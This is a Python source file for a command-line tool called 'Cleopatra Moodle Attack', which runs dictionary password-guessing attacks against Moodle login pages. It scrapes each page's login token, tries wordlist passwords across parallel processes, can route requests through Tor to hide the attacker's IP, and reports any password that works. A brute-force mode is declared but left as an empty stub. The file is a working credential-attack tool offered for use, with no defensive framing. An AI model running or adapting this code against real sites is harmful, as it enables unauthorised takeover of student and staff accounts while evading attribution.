
import re
import sys
import json
import math
import argparse
import requests
import multiprocessing

from time import sleep
from os.path import isfile
from os import name as whoami
from argparse import RawTextHelpFormatter

##############################################################################################

class colors(object):

    if (whoami != 'nt'):
        GREEN = '\033[1;32m'
        RED = '\033[1;31m'
        BLUE = '\033[1;34m'
        YELLOW = '\033[1;33m'
        CYAN = '\033[1;36m'
        WHITE = '\033[1;30m'
        RESET = '\033[0m'

    else:
        import colorama
        colorama.init()

        GREEN = colorama.Fore.GREEN
        RED = colorama.Fore.RED
        BLUE = colorama.Fore.BLUE
        YELLOW = colorama.Fore.YELLOW
        CYAN = colorama.Fore.CYAN
        WHITE = colorama.Fore.WHITE
        RESET = colorama.Style.RESET_ALL

##############################################################################################

class MoodleLogin:

    def __init__(self):

        self._username = None
        self._password = None
        self._successful_pattern = None
        self._token = None
        self._url = None
        self._proxies = None

    def setUsername(self, username: str) -> None:

        self._username = username

    def setPassword(self, password: str) -> None:

        self._password = password

    def setURL(self, url: str) -> None:

        self. _url = url

    def setSuccessfulPattern(self, pattern: str) -> None:

        self._successful_pattern = pattern

    def setTorProxy(self) -> None:

        self._proxies = {'http': 'socks5h://localhost:9050', 'https': 'socks5h://localhost:9050'}

    def getPassword(self) -> str:

        return self._password

    def getIPAddress(self):

        return (json.loads(requests.get("http://httpbin.org/ip", proxies=self._proxies).text))["origin"]

    def _buildPayload(self) -> dict:

        return { "username": self._username, "password": self._password, "logintoken": self._token }

    def _getTokenFromGETRequests(self, session: requests.Session) -> str:

        response = session.get(url = self._url)
        regex = re.compile(r'<input type="hidden" name="logintoken" value="(\w{32})">')
        
        return regex.search(response.text).groups()[0]

    def _getSession(self) -> requests.Session:

        session = requests.Session()
        session.proxies = self._proxies
        self._token = self._getTokenFromGETRequests(session)
        payload = self._buildPayload()
        session.post(url = self._url, data = payload)

        return session

    def getLoginStatus(self) -> bool:
        
        session = self._getSession()
        response = session.get(self._url).text
        regex = re.compile(self._successful_pattern)

        return True if regex.search(response) else False

##############################################################################################

def getLinesFromFile(filename: str) -> list:

    words = []

    try:

        with open(filename, 'r') as file:
            lines = file.readlines()
            for line in lines:
                words.append(line.strip())

    except FileNotFoundError:
        
        return False

    return words

def getBreakpoints(processes: int, passwords: list) -> list:
    
    ''' Obtener diccionarios de punto inicio y fin de la lista passwords por núcleo  ''' 

    return [ {'start': math.ceil((len(passwords) / processes) * index), 'end': math.ceil((len(passwords) / processes) * (index + 1))} for index in range(processes)]

def getArgumentsForFunctionFindPassword(moodleLogin: MoodleLogin, passwords: list, breakpoints: list) -> list:

    return [ (moodleLogin, passwords[bp["start"]:bp["end"]]) for bp in breakpoints ]

def generateRandomPasswords() -> None:
    pass

def getPasswords(type_attack: str, password_file: str) -> list:

    if type_attack == "dictionary":
        
        if not password_file:
            print(f" {colors.WHITE}[{colors.RED}x{colors.WHITE}] A dictionary file has not been set")
            sys.exit(1)

        passwords = getLinesFromFile(password_file)
        
        if not passwords:
            print(f" {colors.WHITE}[{colors.RED}x{colors.WHITE}] Dictionary file does not exist\n\n")
            sys.exit(1) 

    elif type_attack == "brute-force":
        passwords = generateRandomPasswords()

    else:
        print(f" {colors.WHITE}[{colors.RED}x{colors.WHITE}] There is no such type of attack")
        sys.exit(1)

    return passwords

def findPassword(args: tuple) -> bool:

    (moodleLogin, passwords) = args

    index = 0
    finded = False

    while index < len(passwords) and not finded:

        password = passwords[index]
        moodleLogin.setPassword(password)
        print(f" [{moodleLogin.getIPAddress()}] Trying with {password}")
        
        if moodleLogin.getLoginStatus():
            finded = True

        index += 1

    return False if not finded else password

def startAttack(args: tuple) -> None:

    (username, url, successful_pattern, type_attack, password_file, processes, tor_proxy) = args

    passwords = getPasswords(type_attack, password_file)  

    moodleLogin = MoodleLogin()
    moodleLogin.setUsername(username)
    moodleLogin.setURL(url)
    moodleLogin.setSuccessfulPattern(successful_pattern)

    if tor_proxy:
        moodleLogin.setTorProxy()

    print(f" Total CPU Cores: {multiprocessing.cpu_count()}")
    print(f" Total processes to use: {processes}\n\n")

    print(f" {colors.WHITE}[{colors.BLUE}*{colors.WHITE}] Launching attack ...\n\n")

    breakpoints = getBreakpoints(processes, passwords)

    args = getArgumentsForFunctionFindPassword(moodleLogin, passwords, breakpoints)

    with multiprocessing.Pool(processes=processes) as pool:
        for password_found in pool.imap_unordered(findPassword, args):
            if password_found:
                print(f"\n {colors.WHITE}[{colors.GREEN}+{colors.WHITE}] Password found: {password_found}\n\n")
                break
        else:
            print(f"\n {colors.WHITE}[{colors.RED}x{colors.WHITE}] Password not found.\n\n")

def printBanner() -> None:

    banner = f"{colors.RED}\n\n ▄████▄   ██▓    ▓█████  ▒█████   ██▓███   ▄▄▄     ▄▄▄█████▓ ██▀███   ▄▄▄      \n"
    banner += "▒██▀ ▀█  ▓██▒    ▓█   ▀ ▒██▒  ██▒▓██░  ██▒▒████▄   ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    \n"
    banner += "▒▓█    ▄ ▒██░    ▒███   ▒██░  ██▒▓██░ ██▓▒▒██  ▀█▄ ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  \n"
    banner += "▒▓▓▄ ▄██▒▒██░    ▒▓█  ▄ ▒██   ██░▒██▄█▓▒ ▒░██▄▄▄▄██░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ \n"
    banner += "▒ ▓███▀ ░░██████▒░▒████▒░ ████▓▒░▒██▒ ░  ░ ▓█   ▓██▒ ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒\n"
    banner += "░ ░▒ ▒  ░░ ▒░▓  ░░░ ▒░ ░░ ▒░▒░▒░ ▒▓▒░ ░  ░ ▒▒   ▓▒█░ ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░\n"
    banner += "  ░  ▒   ░ ░ ▒  ░ ░ ░  ░  ░ ▒ ▒░ ░▒ ░       ▒   ▒▒ ░   ░      ░▒ ░ ▒░  ▒   ▒▒ ░\n"
    banner += "░          ░ ░      ░   ░ ░ ░ ▒  ░░         ░   ▒    ░        ░░   ░   ░   ▒   \n"
    banner += "░ ░          ░  ░   ░  ░    ░ ░                 ░  ░           ░           ░  ░\n"
    banner += "░                                                                              \n"
    banner += f"                             {colors.RESET}Created by RamPanic\n\n"

    print(banner)

##############################################################################################

if __name__ == "__main__":

    printBanner()

    DEFAULT_PROCESSES = 2

    parser = argparse.ArgumentParser()

    parser.formatter_class = RawTextHelpFormatter

    parser.description = 'Cleopatra Moodle Attack (CMA) is a tool that allows you to launch brute force or dictionary attacks on website logins based on the Moodle platform.'
    parser.usage = "cleopatra.py [OPTIONS]"
    
    parser.epilog = """
\033[1;31mExample:\033[0;39m cleopatra.py -u rex --url https://example.edu.es/login/index.php -t dictionary --successful-pattern "User details" -w /usr/share/wordlists/examples.lst
         cleopatra.py -u julia --url https://example.edu.es/login/index.php -t brute-force --successful-pattern "User details"
        
    """

    main_arguments = parser.add_argument_group('main arguments')
    main_arguments.add_argument('-u', '--username', help='Login form username', required=True)
    main_arguments.add_argument('--url', help='Login URL', required=True)
    main_arguments.add_argument('--successful-pattern', help='Successful login pattern', required=True)
    main_arguments.add_argument('-t', '--type', help='Attack type', required=True)
    main_arguments.add_argument('-w', '--password-file', help='Dictionary to use', default=False)

    # Optional arguments
    parser.add_argument('--tor-proxy', help='Active tor proxy', default=False, action='store_true')
    parser.add_argument('--processes', type=int, help=f'Number of process to use. WARNING: Please do it under your own care. Default: {DEFAULT_PROCESSES}', default=DEFAULT_PROCESSES)

    args = parser.parse_args()

    try:
        startAttack((args.username, args.url, args.successful_pattern, args.type, args.password_file, args.processes, args.tor_proxy))
    except Exception as error:
        print(f"\n {colors.WHITE}[{colors.RED}x{colors.WHITE}] Error: {error}\n\n")
    except KeyboardInterrupt:
        print(f"\n {colors.WHITE}[{colors.BLUE}*{colors.WHITE}] Aborting attack...\n\n")
    finally:
        sleep(2)
